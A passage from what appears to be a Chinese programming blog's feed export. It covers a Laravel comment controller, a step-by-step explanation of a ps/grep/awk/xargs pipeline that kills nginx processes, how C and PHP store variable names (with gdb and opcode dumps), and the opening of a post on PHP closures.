<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">comment</span><span class="params">(Post $post, Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;validate($request, [</span><br><span class="line">        <span class="string">'content'</span> =&gt; <span class="string">'required|min:5'</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    $comment = <span class="keyword">new</span> Comment([</span><br><span class="line">        <span class="string">'content'</span> =&gt; $request-&gt;get(<span class="string">'content'</span>),</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; auth()-&gt;user()-&gt;id,</span><br><span class="line">        <span class="string">'post_id'</span> =&gt; $post-&gt;id,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    $post-&gt;comments()-&gt;save($comment);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect()-&gt;back();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只需要在方法的参数上面标明所需的方法，就可以在代码直接用了，ioc容器替我们自动注入了依赖！</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>一条Linux命令</title>
    <url>/2018/linux/one-linux-command.html</url>
    <content><![CDATA[<p>咱今天先从一个命令讲起，先看一个命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef|grep nginx|awk '&#123;print $2&#125;'|xargs sudo kill -9</span><br></pre></td></tr></table></figure>
<p>上面这条命令使用了管道组合了多个命令，作用是找个所有进程名字包含 <strong>nginx</strong> 的进程，然后 kill 这些进程。</p>
<hr>
<h3 id="1-首先是ps这个命令，简单的说是查看当前系统进程。"><a href="#1-首先是ps这个命令，简单的说是查看当前系统进程。" class="headerlink" title="1.首先是ps这个命令，简单的说是查看当前系统进程。"></a>1.首先是ps这个命令，简单的说是查看当前系统进程。</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: ps [OPTION]</span><br></pre></td></tr></table></figure>
<p>在Linux的世界里，一个看似简单的命令，其背后的参数十分丰富，功能十分强大，如果你 man 一下这个命令，其手册打印出来估计有几十页，参数多达几十个，估计能记住的人不多，<br>但是好在平时我们只用到其中几个参数就够用了。所以这里我也只是简单说下常用参数和常见应用场景，详细命令可以man或者help。</p>
<p>对于ps这个命令，按照手册的说法，它有不同的风格，有适合UNIX，有适合BSD，一般来说，<strong>ps -axu</strong> 和 <strong>ps -ef</strong> 效果是一样的。<br>其结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root         1     0  0 10:12 ?        00:00:02 /sbin/init splash</span><br><span class="line">root         2     0  0 10:12 ?        00:00:00 [kthreadd]</span><br><span class="line">root         3     2  0 10:12 ?        00:00:00 [rcu_gp]</span><br><span class="line">root         4     2  0 10:12 ?        00:00:00 [rcu_par_gp]</span><br><span class="line">root         6     2  0 10:12 ?        00:00:00 [kworker/0:0H]</span><br><span class="line">root         8     2  0 10:12 ?        00:00:00 [mm_percpu_wq]</span><br><span class="line">root         9     2  0 10:12 ?        00:00:00 [ksoftirqd/0]</span><br><span class="line">root        10     2  0 10:12 ?        00:00:20 [rcu_sched]</span><br><span class="line">root        11     2  0 10:12 ?        00:00:00 [rcu_bh]</span><br><span class="line">root        12     2  0 10:12 ?        00:00:00 [migration/0]</span><br><span class="line">root        13     2  0 10:12 ?        00:00:00 [idle_inject/0]</span><br><span class="line">root        15     2  0 10:12 ?        00:00:00 [cpuhp/0]</span><br><span class="line">root        16     2  0 10:12 ?        00:00:00 [cpuhp/1]</span><br><span class="line">root        17     2  0 10:12 ?        00:00:00 [idle_inject/1]</span><br><span class="line">root        18     2  0 10:12 ?        00:00:00 [migration/1]</span><br><span class="line">root        19     2  0 10:12 ?        00:00:00 [ksoftirqd/1]</span><br><span class="line">root        21     2  0 10:12 ?        00:00:00 [kworker/1:0H-kb]</span><br><span class="line">root        22     2  0 10:12 ?        00:00:00 [cpuhp/2]</span><br><span class="line">root        23     2  0 10:12 ?        00:00:00 [idle_inject/2]</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="2-grep命令"><a href="#2-grep命令" class="headerlink" title="2.grep命令"></a>2.grep命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: grep [OPTION]... PATTERN [FILE]...</span><br></pre></td></tr></table></figure>
<p>这个命令是用来搜索文本内容，支持丰富的参数, 最简单的用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ grep server /etc/nginx/nginx.conf </span><br><span class="line">	<span class="comment"># server_tokens off;</span></span><br><span class="line">	<span class="comment"># server_names_hash_bucket_size 64;</span></span><br><span class="line">	<span class="comment"># server_name_in_redirect off;</span></span><br><span class="line">	ssl_prefer_server_ciphers on;</span><br><span class="line"><span class="comment">#	server &#123;</span></span><br><span class="line"><span class="comment">#	server &#123;</span></span><br><span class="line">jwang@jwang:~$</span><br></pre></td></tr></table></figure>
<p>上面的命令是打印出nginx.conf文件里面所有包含server文字的行，默认情况下，这个搜索是模糊匹配，而且是区分大小写的。</p>
<p>常用参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-i ：不忽略大小写 </span><br><span class="line">-n ：显示行号 </span><br><span class="line">-c ：显示匹配的数量 </span><br><span class="line">-v ：反向选择，亦即显示出没有 ‘搜寻字符串’ 内容的那一行</span><br><span class="line">-r ：递归搜索目录下所有文件</span><br></pre></td></tr></table></figure>
<p>这个还支持正则表达式搜索，我平时用的少，大部分时候普通字符串就够用了。</p>
<p>还有几个挺有意思的参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-B, --before-context=NUM  打印出搜索结果的前NUM行</span><br><span class="line">-A, --after-context=NUM   打印出搜索结果的后NUM行</span><br><span class="line">-C, --context=NUM         打印出搜索结果的前后NUM行</span><br></pre></td></tr></table></figure>
<p>举个例子 <code>grep -C 2 jwang /etc/passwd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ grep -C 2 jwang /etc/passwd</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/<span class="literal">false</span></span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/<span class="literal">false</span></span><br><span class="line">jwang:x:1000:1000:JWang,,,:/home/jwang:/bin/bash</span><br><span class="line">nvidia-persistenced:x:121:129:NVIDIA Persistence Daemon,,,:/:/sbin/nologin</span><br><span class="line">mysql:x:122:131:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>所以 <code>ps -ef|grep nginx</code>的结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root     26642     1  0 17:36 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span><br><span class="line">www-data 26643 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26644 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26645 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26646 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26647 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26648 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26649 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data 26650 26642  0 17:36 ?        00:00:00 nginx: worker process</span><br><span class="line">jwang    28782 18097  0 18:31 pts/20   00:00:00 grep --color=auto nginx</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-awk命令"><a href="#3-awk命令" class="headerlink" title="3.awk命令"></a>3.awk命令</h3><blockquote>
<p>Awk是一种便于使用且表达能力强的程序设计语言，可应用于各种计算和数据处理任务。</p>
</blockquote>
<p>看这介绍就知道awk多强大，都上升到语言的层次，先说说一开始的命令里面用法: <code>awk &#39;{print $2}&#39;</code></p>
<p>默认情况下，awk使用 <strong>空格</strong> 去分割字符串，把上面的结果每一行按照空格去分割成N块，其中$0代表字符串本身，$1代表第一个块，$2代表第二个块，以此类推….</p>
<p>所以<code>ps -ef|grep nginx|awk &#39;{print $2}&#39;</code>的结果是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">26642</span><br><span class="line">26643</span><br><span class="line">26644</span><br><span class="line">26645</span><br><span class="line">26646</span><br><span class="line">26647</span><br><span class="line">26648</span><br><span class="line">26649</span><br><span class="line">26650</span><br><span class="line">28836</span><br></pre></td></tr></table></figure>
<p>awk常用参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. -F fs or --field-separator fs 指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式</span><br><span class="line">2. -v var=value or --asign var=value 赋值一个用户定义变量。</span><br><span class="line">3. -f scripfile or --file scriptfile 从脚本文件中读取awk命令。</span><br></pre></td></tr></table></figure>

<p>关于awk脚本，我们需要注意两个关键词BEGIN和END。</p>
<p>BEGIN{ 这里面放的是执行前的语句 }</p>
<p>END {这里面放的是处理完所有的行后要执行的语句 }</p>
<p>{这里面放的是处理每一行时要执行的语句}</p>
<blockquote>
<p>假设有这么一个文件（学生成绩表）：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat score.txt</span><br><span class="line">Marry   2143 78 84 77</span><br><span class="line">Jack    2321 66 78 45</span><br><span class="line">Tom     2122 48 77 71</span><br><span class="line">Mike    2537 87 97 95</span><br><span class="line">Bob     2415 40 57 62</span><br></pre></td></tr></table></figure>
<p>我们的awk脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat cal.awk</span><br><span class="line"><span class="comment">#!/bin/awk -f</span></span><br><span class="line"><span class="comment">#运行前</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">    math = 0</span><br><span class="line">    english = 0</span><br><span class="line">    computer = 0</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n"</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"---------------------------------------------\n"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行中</span></span><br><span class="line">&#123;</span><br><span class="line">    math+=<span class="variable">$3</span></span><br><span class="line">    english+=<span class="variable">$4</span></span><br><span class="line">    computer+=<span class="variable">$5</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"%-6s %-6s %4d %8d %8d %8d\n"</span>, <span class="variable">$1</span>, <span class="variable">$2</span>, <span class="variable">$3</span>,<span class="variable">$4</span>,<span class="variable">$5</span>, <span class="variable">$3</span>+<span class="variable">$4</span>+<span class="variable">$5</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行后</span></span><br><span class="line">END &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"---------------------------------------------\n"</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"  TOTAL:%10d %8d %8d \n"</span>, math, english, computer</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">"AVERAGE:%10.2f %8.2f %8.2f\n"</span>, math/NR, english/NR, computer/NR</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们来看一下执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ awk -f cal.awk score.txt</span><br><span class="line">NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL</span><br><span class="line">---------------------------------------------</span><br><span class="line">Marry  2143     78       84       77      239</span><br><span class="line">Jack   2321     66       78       45      189</span><br><span class="line">Tom    2122     48       77       71      196</span><br><span class="line">Mike   2537     87       97       95      279</span><br><span class="line">Bob    2415     40       57       62      159</span><br><span class="line">---------------------------------------------</span><br><span class="line">  TOTAL:       319      393      350</span><br><span class="line">AVERAGE:     63.80    78.60    70.00</span><br></pre></td></tr></table></figure>

<blockquote>
<p>再看一个案例，查出nginx日志里面状态为500的请求:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;$9 &#x3D;&#x3D; 500 &#123;print $0&#125;&#39; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p>awk还支持常见的if while等逻辑控制语句。</p>
<hr>
<h3 id="4-xargs命令"><a href="#4-xargs命令" class="headerlink" title="4.xargs命令"></a>4.xargs命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</span><br></pre></td></tr></table></figure>
<p>这个命令作用是使用接收的内容当作参数去执行一条命令，一般都是配合管道使用，比如说在上面的例子里面，xargs的作用就是接收前面的pid，然后执行kill命令。</p>
<p>再看个例子： <code>sudo find / -name nginx |xargs ls -l</code></p>
<p>这个命令意思是列出所有目录名或者文件名包含nginx的详情，其结果大概是这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rw-r--r-- 1 root  root      389 2月  12  2017 /etc/default/nginx</span><br><span class="line">-rwxr-xr-x 1 root  root     4579 2月  12  2017 /etc/init.d/nginx</span><br><span class="line">-rw-r--r-- 1 root  root      329 2月  12  2017 /etc/logrotate.d/nginx</span><br><span class="line">-rw-r--r-- 1 root  root      374 2月  12  2017 /etc/ufw/applications.d/nginx</span><br><span class="line">-rwxr-xr-x 1 root  root  1230768 7月  12  2017 /usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">/etc/nginx:</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x 2 root root 4096 7月  12  2017 conf.d</span><br><span class="line">-rw-r--r-- 1 root root 1077 2月  12  2017 fastcgi.conf</span><br><span class="line">-rw-r--r-- 1 root root 1007 2月  12  2017 fastcgi_params</span><br><span class="line">-rw-r--r-- 1 root root 2837 2月  12  2017 koi-utf</span><br><span class="line">-rw-r--r-- 1 root root 2223 2月  12  2017 koi-win</span><br><span class="line">-rw-r--r-- 1 root root 3957 2月  12  2017 mime.types</span><br><span class="line">-rw-r--r-- 1 root root 1462 2月  12  2017 nginx.conf</span><br><span class="line">-rw-r--r-- 1 root root  180 2月  12  2017 proxy_params</span><br><span class="line">-rw-r--r-- 1 root root  636 2月  12  2017 scgi_params</span><br><span class="line">drwxr-xr-x 2 root root 4096 11月  7 14:01 sites-available</span><br><span class="line">drwxr-xr-x 2 root root 4096 11月  7 14:01 sites-enabled</span><br><span class="line">drwxr-xr-x 2 root root 4096 5月   6  2018 snippets</span><br><span class="line">-rw-r--r-- 1 root root  664 2月  12  2017 uwsgi_params</span><br><span class="line">-rw-r--r-- 1 root root 3071 2月  12  2017 win-utf</span><br><span class="line"></span><br><span class="line">/home/jwang/Documents/Work/trunk/webroot/static/lib/codemirror/mode/nginx:</span><br><span class="line">total 20</span><br><span class="line">-rw-rw-r-- 1 jwang jwang  5230 5月   7  2018 index.html</span><br><span class="line">-rw-rw-r-- 1 jwang jwang 10169 5月   7  2018 nginx.js</span><br><span class="line"></span><br><span class="line">/usr/share/doc/nginx:</span><br><span class="line">total 12</span><br><span class="line">lrwxrwxrwx 1 root root   33 7月  12  2017 changelog.Debian.gz -&gt; ../nginx-core/changelog.Debian.gz</span><br><span class="line">-rw-r--r-- 1 root root 8641 2月  12  2017 copyright</span><br><span class="line"></span><br><span class="line">/usr/share/nginx:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 root root 4096 5月   6  2018 html</span><br></pre></td></tr></table></figure>
<p>所以，最后的xargs命令是把前面筛选得到的pid作为参数传给命令kill执行，有时候会有权限问题，所以这里加了个sudo。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>变量名存放在哪里？</title>
    <url>/2018/coding/where-is-variable-value.html</url>
    <content><![CDATA[<p>这是一个有意思且无聊的问题，之前在网上看到有人问道这个问题，比如说在PHP里面我们写下 <code>$name = &quot;名字&quot;</code> 这样的代码语句，在代码运行的时候，$name 在哪里呢？ 了解了变量在内存中存储方式的人会知道，一般变量的值在存放在栈内存里面的，但是名字呢？</p>
<p>针对这个问题，咱们先要区分一下编译型语言和解释型语言，这2种语言运行方式完全不一样，C/C++是典型的编译型语言，而且PHP/JS则是典型的解释型语言。</p>
<a id="more"></a>

<p>编译型语言要想运行，必须使用一个编译器去把代码转换成目标平台机器代码。而解释型语言是通过一个解释器实时翻译成一种中间代码一行行运行。前者又被称为静态语言，后者又被称为动态语言。像Java，C#则属于这2种中间，因为他们有一个预编译的过程，会先把代码转换成中间代码存放起来，在Java里面就叫字节码，然后在虚拟机（jvm）里面执行，效率比纯解释执行高。PHP就有一个opcache扩展可以把生成的中间代码opcode缓存起来以提高效率，不必每次运行的时候都生成。</p>
<p>说这么多，想说明一个问题，那就是变量名和变量在这2种语言里面的存储是有区别的，回到最开始的问题，咱先说说经典的C语言：</p>
<hr>
<h2 id="C语言里面变量和变量名的存储"><a href="#C语言里面变量和变量名的存储" class="headerlink" title="C语言里面变量和变量名的存储"></a>C语言里面变量和变量名的存储</h2><p>为了说明这个问题，咱们简单的来说一下C里面变量在内存里面的存储：</p>
<p>1.栈区（stack）— 由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。</p>
<p>2.堆区（heap） — 一般由程序员分配释放， 用来存储数组，结构体，对象等。若程序员不释放，程序结束时可能由OS回收。</p>
<p>3.全局区（静态区）（static）— 存放全局变量、静态数据、常量。程序结束后由系统释放。</p>
<p>4.文字常量区 — 常量字符串就是放在这里的。 程序结束后由系统释放。</p>
<p>5.程序代码区 — 存放函数体（类成员函数和全局函数）的二进制代码。</p>
<img src = "/images/old/5f6e3e27ly1fxehedktbwj20u70fn75i.jpg" />

<p>栈内存是有大小限制的，比如默认情况下，Linux平台的是8MB，如果超过这个限制，就会出现 <strong>stackoverflow</strong>，而堆内存并无限制，内存有多大就可以申请多大。</p>
<p>看完上面的说明，我们可以得出一个结论: 全局变量存放在全局区，在程序一开始就分配好了，而且局部变量在存放在栈区，运行的时候分配内存，用完之后内存会被自动释放。</p>
<p>但是这好像并没有说明变量名在哪里吧？比如下面这段C代码,a, b到底存在哪里？：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>; <span class="comment">//全局初始化区</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b; <span class="comment">//栈</span></span><br><span class="line">    b = a + <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了搞明白这个问题，我们需要了解一下C语言的执行过程,C语言执行需要经过预处理(Preprocessing)、编译(Compilation)、汇编(Assemble)、链接(Linking)等几个阶段，在编译成汇编语言这个阶段就已经没有变量名了，使用gdb可以查看编译后的汇编代码：</p>
<figure class="highlight as"><table><tr><td class="code"><pre><span class="line">   (gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   <span class="number">0x0000000000400526</span> &lt;+<span class="number">0</span>&gt;:	push   %rbp</span><br><span class="line">   <span class="number">0x0000000000400527</span> &lt;+<span class="number">1</span>&gt;:	mov    %rsp,%rbp</span><br><span class="line">   <span class="number">0x000000000040052a</span> &lt;+<span class="number">4</span>&gt;:	sub    $<span class="number">0x20</span>,%rsp</span><br><span class="line">   <span class="number">0x000000000040052e</span> &lt;+<span class="number">8</span>&gt;:	mov    %edi,<span class="number">-0x14</span>(%rbp)</span><br><span class="line">   <span class="number">0x0000000000400531</span> &lt;+<span class="number">11</span>&gt;:	mov    %rsi,<span class="number">-0x20</span>(%rbp)</span><br><span class="line">   0x0000000000400535 &lt;+15&gt;:	mov    0x200afd(%rip),%eax        # 0x601038 &lt;a&gt;</span><br><span class="line">   <span class="number">0x000000000040053b</span> &lt;+<span class="number">21</span>&gt;:	add    $<span class="number">0x5</span>,%eax</span><br><span class="line">   <span class="number">0x000000000040053e</span> &lt;+<span class="number">24</span>&gt;:	mov    %eax,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">   <span class="number">0x0000000000400541</span> &lt;+<span class="number">27</span>&gt;:	mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">   <span class="number">0x0000000000400544</span> &lt;+<span class="number">30</span>&gt;:	mov    %eax,%esi</span><br><span class="line">   <span class="number">0x0000000000400546</span> &lt;+<span class="number">32</span>&gt;:	mov    $<span class="number">0x4005e4</span>,%edi</span><br><span class="line">   <span class="number">0x000000000040054b</span> &lt;+<span class="number">37</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000400550</span> &lt;+<span class="number">42</span>&gt;:	callq  <span class="number">0x400400</span> &lt;printf@plt&gt;</span><br><span class="line">=&gt; <span class="number">0x0000000000400555</span> &lt;+<span class="number">47</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x000000000040055a</span> &lt;+<span class="number">52</span>&gt;:	leaveq </span><br><span class="line">   <span class="number">0x000000000040055b</span> &lt;+<span class="number">53</span>&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>虽然上面这个很难读懂，但是应该能看到在这一大堆汇编指令执行的背后，并没有变量名这个东西，所有的变量名到最后都变成了内存地址，汇编指令操作的是各种寄存器和内存地址。</p>
<blockquote>
<p>定义int a;时,编译器分配4个字节内存,并命名该4个字节的空间名字为a(即变量名),当用到变量名a时,就是在使用那4个字节的内存空间。 </p>
<p>5是一个常数,在程序编译时存放在代码的常量区存放着它的值(就是5),当执行a=5时,程序将5这个常量拷贝到a所在的4个字节空间中,就完成了赋值操作.a是我们对那个整形变量的4个字节取的”名字”,是我们人为给的,实际上计算机并不存储a这个名字,只是我们编程时给那4个字节内存取个名字好用。</p>
<p>实际上程序在编译时,所有的a都转换为了那个地址空间了,编译成机器代码后,没有a这个说法了。</p>
<p>a这个名字只存在于我们编写的代码中.5不是被随机分配的,而总是位于程序的数据段中,可能在不同的机器上在数据段中的位置可能不一致,它的地址其实不能以我们常用到的内存地址来理解,因为牵扯到一个叫”计算机寻址方式”的问题。</p>
</blockquote>
<p>以上的内容有参考网上很多文章，仅供参考！有一点需要明白在操作系统里面，程序的内存地址并不是物理地址，而且通过一个基址+偏移量的方式的计算得到的虚拟地址，操作系统为了更好的管理应用在内存这个层面做了很多抽象。</p>
<hr>
<h2 id="PHP里面的变量和变量名存储"><a href="#PHP里面的变量和变量名存储" class="headerlink" title="PHP里面的变量和变量名存储"></a>PHP里面的变量和变量名存储</h2><p>PHP语句在执行的时候需要zend引擎进行词法分析，语法分析，编译成opcode，opcode可以理解为一种类似机器指令的语句，然后由zend引擎去执行。</p>
<p>有扩展可以打印出生成的opcode，下面看一下：</p>
<p>PHP代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">($d,$e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c = $d+$e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hello($a, $b);</span><br></pre></td></tr></table></figure>

<p>opcode结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ php7.0 -dvld.active=1 ~/index.php </span><br><span class="line">Finding entry points</span><br><span class="line">Branch analysis from position: 0</span><br><span class="line">1 jumps found. (Code = 62) Position 1 = -2</span><br><span class="line">filename:       /home/jwang/index.php</span><br><span class="line">function name:  (null)</span><br><span class="line">number of ops:  14</span><br><span class="line">compiled vars:  !0 = $a, !1 = $b</span><br><span class="line">line     #* E I O op                           fetch          ext  return  operands</span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line">   2     0  E &gt;   EXT_STMT                                                 </span><br><span class="line">         1        ASSIGN                                                   !0, 1</span><br><span class="line">   3     2        EXT_STMT                                                 </span><br><span class="line">         3        ASSIGN                                                   !1, 2</span><br><span class="line">   5     4        EXT_STMT                                                 </span><br><span class="line">         5        NOP                                                      </span><br><span class="line">  10     6        EXT_STMT                                                 </span><br><span class="line">         7        INIT_FCALL                                               'hello'</span><br><span class="line">         8        EXT_FCALL_BEGIN                                          </span><br><span class="line">         9        SEND_VAR                                                 !0</span><br><span class="line">        10        SEND_VAR                                                 !1</span><br><span class="line">        11        DO_FCALL                                      0          </span><br><span class="line">        12        EXT_FCALL_END                                            </span><br><span class="line">  11    13      &gt; RETURN                                                   1</span><br><span class="line"></span><br><span class="line">branch: #  0; line:     2-   11; sop:     0; eop:    13; out0:  -2</span><br><span class="line">path #1: 0, </span><br><span class="line">Function hello:</span><br><span class="line">Finding entry points</span><br><span class="line">Branch analysis from position: 0</span><br><span class="line">1 jumps found. (Code = 62) Position 1 = -2</span><br><span class="line">filename:       /home/jwang/index.php</span><br><span class="line">function name:  hello</span><br><span class="line">number of ops:  8</span><br><span class="line">compiled vars:  !0 = $d, !1 = $e, !2 = $c</span><br><span class="line">line     #* E I O op                           fetch          ext  return  operands</span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line">   5     0  E &gt;   EXT_NOP                                                  </span><br><span class="line">         1        RECV                                             !0      </span><br><span class="line">         2        RECV                                             !1      </span><br><span class="line">   7     3        EXT_STMT                                                 </span><br><span class="line">         4        ADD                                              ~3      !0, !1</span><br><span class="line">         5        ASSIGN                                                   !2, ~3</span><br><span class="line">   8     6        EXT_STMT                                                 </span><br><span class="line">         7      &gt; RETURN                                                   null</span><br><span class="line"></span><br><span class="line">branch: #  0; line:     5-    8; sop:     0; eop:     7; out0:  -2</span><br><span class="line">path #1: 0, </span><br><span class="line">End of function hello</span><br></pre></td></tr></table></figure>
<p>zend引擎会把PHP代码转换成一组op命令操作，上面的就有2组操作。在第一组命令里面可以看到在开始的时候，有一个<code>compiled vars:  !0 = $a, !1 = $b</code>, 然后后面有2个ASSIGN操作。可以看到在最终执行的时候并不是使用的$a, $b，而是使用了!0, !1这样的符号去代替。</p>
<p>!0, !1并不是一个固定的值，它每次执行的时候代表的是op命令的操作数。op命令是zend引擎自己定义好的一些操作，具体怎么执行得看zend引擎怎么处理了。</p>
<p>PHP的变量则是通过一个 <strong>_zval_struct</strong> 结构体形式存储的，讲道理，大部分时候还在存储在堆内存里面的，既然存储在堆里面那么就必须手动释放内存，所以才有了自动垃圾回收机制！</p>
<hr>
<p>所以，最后总结一下，变量名说到底还是方便程序员编程的，名字起的好便于记忆和阅读代码，就像人一样，名字只是一个代号，本质上只是一堆碳水化合物。</p>
<p>变量名在代码运行的时候都会被一些特殊的符号代替，内存里面并不会有变量名，所以变量名写的长并不会影响运行速度，用中文还是英文也不影响。而变量无论什么类型，最终运行的时候操作的还是内存地址里面数据，变量之所以有类型，是为了方便编译器处理。</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>变量名</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP匿名函数和闭包</title>
    <url>/2018/coding/php/php-closure-function.html</url>
    <content><![CDATA[<h3 id="一-什么是闭包？"><a href="#一-什么是闭包？" class="headerlink" title="一.什么是闭包？"></a>一.什么是闭包？</h3><p>先看看百度百科的介绍：</p>
<blockquote>
<p>闭包包含自由（未绑定到特定对象）变量，这些变量不是在这个代码块内或者任何全局上下文中定义的，而是在定义代码块的环境中定义（局部变量）。<br>“闭包” 一词来源于以下两者的结合：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及它们引用的对象没有被释放）和为自由变量提供绑定的计算环境（作用域）。<br>在PHP、Scala、Scheme、Common Lisp、Smalltalk、Groovy、JavaScript、Ruby、 Python、Go、Lua、objective c、swift 以及Java（Java8及以上）等语言中都能找到对闭包不同程度的支持。</p>
</blockquote>
<p>说实话，这个介绍虽然专业，但是有点僵硬不太容易理解，闭包是一种设计思想，而不是一种语法特性，在PHP语言里面，匿名函数就是闭包的一种实现。</p>
<h3 id="二-匿名函数"><a href="#二-匿名函数" class="headerlink" title="二.匿名函数"></a>二.匿名函数</h3><p>这个我相信大家都多多少少用过，看一下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$f = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    $a = <span class="number">1</span>;</span><br><span class="line">    $b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;;</span><br><span class="line">var_dump($f);</span><br></pre></td></tr></table></figure>
<p>输出结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Closure#1 (0) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>可见，PHP中匿名函数就是闭包，也可以理解为闭包就是把这个函数赋值给一个变量，这时候这个变量保存的就是这个函数的内存地址。</p>
